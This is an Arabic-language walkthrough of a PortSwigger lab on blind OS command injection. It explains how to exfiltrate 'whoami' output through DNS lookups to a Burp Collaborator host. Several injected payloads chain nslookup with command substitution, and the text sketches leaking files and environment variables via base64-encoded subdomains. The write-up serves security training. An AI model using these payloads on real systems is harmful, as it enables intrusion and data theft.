# Lab : Blind OS command injection out-of-band data exfiltration

https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

- الفكره من ال Lab ده ان ده استخدام متقدم شويه عن الlab الي فات وبنفز امر whoami

 

```bash
1. || nslookup $(whoami)seajx7l6zs4xgwp33pzixdggm7s0gq4f.oastify.com ||
```

### الفكرة الأساسية

ده الـ lab اللي بيجمع بين المعملين اللي فاتوا في فكرة واحدة متكاملة:

- التطبيق فيه **blind command injection** (يعني الأمر بينفذ بس مفيش output ظاهر في الـ response).
- **مفيش static file** تقدر تستخدمها عشان تقرا النتيجة (زي معمل الـ output redirection).
- الهدف مش بس تثبت إن الثغرة موجودة (زي معمل الـ OOB proof)، لكن كمان **تسرّب (exfiltrate) نتيجة أمر حقيقي** - وتحديدًا الـ lab غالبًا بيطلب منك تجيب نتيجة `whoami` وتشوفها فعليًا.

يعني الهدف النهائي: تثبت إنك عارف تنفذ أمر نظام على السيرفر **وتقرا نتيجته** رغم إن مفيش أي قناة مباشرة (لا response، لا ملف) توصلك بيها.

### الفكرة التقنية اللي بيعلمها الـ Lab

بما إننا مش قادرين نشوف الـ output مباشرة، بنستخدم **DNS كقناة خروج (exfiltration channel)**:

1. الشل بيدعم **command substitution** - يعني تقدر تحط نتيجة أمر جوه أمر تاني باستخدام backticks ``cmd`` أو `$(cmd)`.
2. لو حطينا نتيجة `whoami` جوه اسم دومين وعملنا `nslookup` عليه، السيرفر هيعمل DNS query لدومين شكله:

```
   <نتيجة-whoami>.your-collaborator-id.oastify.com
```

1. الـ DNS query ده هيوصل لسيرفرات Burp Collaborator، وهتقدر تشوف النتيجة كأنها **subdomain** في الـ interaction log.

### خطوات الحل بالتفصيل

#### 1. جهّز Burp Collaborator

- من Burp Suite: **Burp menu → Burp Collaborator client**.
- دوس **"Copy to clipboard"** عشان تاخد unique payload زي:

```
  xxxxxxxxxxxxxxxxxxxxxxxxxx.oastify.com
```

#### 2. لاقي مكان الحقن

- افتح الموقع (عادة بيكون فيه صفحة "check stock" بتاخد `productID` و `storeID`).
- ابعت الـ request على Burp Repeater.

#### 3. احقن الـ payload

في الـ parameter المتأثر (زي `storeID`)، غيّره لـ:

```
& nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN &
```

أو

```
| nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

> استبدل `BURP-COLLABORATOR-SUBDOMAIN` بالدومين اللي نسخته من الـ Collaborator client.
> 

#### 4. ابعت الـ Request

دوس **Send** في الـ Repeater.

#### 5. ارجع للـ Collaborator وشوف النتيجة

- ارجع لـ Burp Collaborator client.
- دوس **"Poll now"**.
- المفروض تلاقي **DNS interaction** جديدة، وفي تفاصيلها هتلاقي الـ subdomain اللي اتعمله query شكله:

```
  root.xxxxxxxxxxxxxxxxxxxxxxxxxx.oastify.com
```

- يعني نتيجة `whoami` هي `root` (أو أي username تاني حسب إعدادات السيرفر).

#### 6. الـ Lab بيتحل

بمجرد ما الـ DNS interaction يظهر وفيه نتيجة الأمر واضحة في الـ subdomain، الـ lab بيتسجل كـ **solved** تلقائيًا (PortSwigger بيتابع الـ Collaborator interactions بتاعتك ويتأكد إنك سرّبت بيانات فعلية مش مجرد ping).

### ليه ده مهم (الفكرة التعليمية)

- بيوريك إن **DNS مش بس أداة تصفح مواقع** - ممكن تتحول لقناة خفية (covert channel) لتسريب بيانات من سيرفر معزول تمامًا عن أي استجابة مباشرة.
- بيبني على مفهوم **command substitution** في الـ shell، وهو حاجة أساسية تتكرر كتير في الـ injection attacks.
- بيوضح إن حتى لو التطبيق "معزول" (blind) بشكل كامل، لسه ممكن تستخرج منه
معلومات حساسة زي أسماء المستخدمين، متغيرات البيئة، أو حتى محتوى ملفات
(لو حولتها لـ base64 وقسمتها على أجزاء صغيرة تتنقل في subdomains
متعددة).

### نصيحة عملية

- لو الأمر النتيجة بتاعته فيها مسافات أو رموز خاصة (زي مسار ملف `/etc/passwd`)، الـ DNS labels عادة بتاخد بس حروف وأرقام وشرطة، فهتحتاج تعمل **encode** للنتيجة (زي base64) قبل ما تحطها في اسم الدومين، وده بيبقى موضوع في labs متقدمة أكتر.
